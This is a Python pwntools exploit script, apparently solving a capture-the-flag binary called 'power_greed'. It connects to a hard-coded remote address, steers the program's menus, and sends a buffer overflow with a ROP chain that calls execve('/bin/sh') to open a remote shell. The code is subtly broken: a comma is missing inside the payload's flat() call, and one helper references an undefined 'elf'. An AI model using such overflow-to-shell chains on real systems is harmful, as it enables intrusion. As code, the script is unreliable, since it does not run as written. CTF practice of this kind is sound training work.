#!/usr/bin/python3

from pwn import *

exe = ELF("power_greed_patched", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
break *0x0000000000401F66
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def diagnostic_center():
    io.sendlineafter(b"> ", b"1")

def vulnerability_scan():
    io.sendlineafter(b"> ", b"1")

def do_you_want_to_test_that():
	io.sendlineafter(b"(y/n)", b"y")

def crash_test(value:int):
	io.sendlineafter(b"buffer: ", value)
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.123.119:35198"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.05

diagnostic_center()
vulnerability_scan()
do_you_want_to_test_that()

# pop rdi ; ret       -> &"/bin/sh"
# pop rsi ; ret       -> 0
# pop rdx ; ret       -> 0
# pop rax ; ret       -> 59 # execve
# syscall ; ret

pop_rdi = 0x000000000041ff27
pop_rsi_rbp = 0x000000000040c002
pop_rdx = 0x000000000047d564
pop_rax = 0x000000000042adab
syscall_ret = 0x000000000040141a
bin_sh_offset = 0x0000000000481778

payload = flat(
	b"a" * 56,
	pop_rdi,
	bin_sh_offset
 	pop_rsi_rbp,
    p64(0x0),
    p64(0x0),
    pop_rdx,
    p64(0x0),
    p64(0x0),
    p64(0x0),
    pop_rax,
    p64(59), # execve
    syscall_ret
)

crash_test(payload)

io.interactive()
